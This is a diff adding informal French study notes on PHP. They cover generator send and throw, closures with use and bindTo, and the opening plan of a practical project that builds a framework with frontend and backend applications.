+
+- send = permet d'envoyer des données, en gros quand on va faire $pouet = myGen();  puis $pouet->send('merde'),
+  le 'merde' remplacera le yield exploité dans la fonction
+  ==> quand on utilise les generateurs comme ca, on parle de generateur inverse ou de co-routine
+
+- throw idem mais a la place du yield ca throw une exception, genre $gen->throw(new Exception('merde'));
+
+- __wakeup = bah c'est probablement lors de la deserialisation
+
+
+===[les closures]===
+
+c'est des fonctions anonymes 
+genre 
+$pouet = function () {
+//code
+};
+
+et apres on peut faire pouet();
+
+tres utilisées pour les callback 
+
+en fait c'est une instanciation d'objet de la classe Closure
+elle a une methode magique __invoke() appellee quand on se sert de notre objet comme d'une fonction
+
+on peut importer une variable dans le code d'une closure avec le kw use
+genre
+$qte = 42;
+$maFunc = function () use ($qte) {
+ echo $qte;
+};
+
+
+
+on peut lier une closure a un objet (utile quand le code d'une closure a des $this)
+on fait comme ca 
+$additionneur = function()
+{
+  $this->_nbr += 5;
+};
+
+class MaClasse
+{
+  private $_nbr = 0;
+
+  public function nbr()
+  {
+    return $this->_nbr;
+  }
+}
+
+$obj = new MaClasse;
+
+// On obtient une copie de notre closure qui sera liée à notre objet $obj
+// Cette nouvelle closure sera appelée en tant que méthode de MaClasse
+// On aurait tout aussi bien pu passer $obj en second argument
+$additionneur = $additionneur->bindTo($obj, 'MaClasse');
+$additionneur();
+
+echo $obj->nbr(); // Affiche bien 5
+
+
+en fait, on peut directement declarer une closure dans une methode de classe, du coup le $this correspondra au pointeur 
+sur l'instance.
+
+
+
+
+
+===[TP application]===
+
+en gros on va faire un site web en application 
+et le projet perso ca sera de faire un systeme de cache
+yaura donc 2 applis, une partie front office et une backoffice pour l'administration du site
+
+yaura une classe Application, avec des classes derivées
+ce sera le coeur du framework
+
+on va faire l'architecture suivante :
+
+- un dossier App qui contient les 2 appli front et back 
+- /App/Nomdelapplication/Modules contiendra les modules de l'appli (genre si ya un module news, on aura 
+  /App/Frontend/Modules/News
+
+
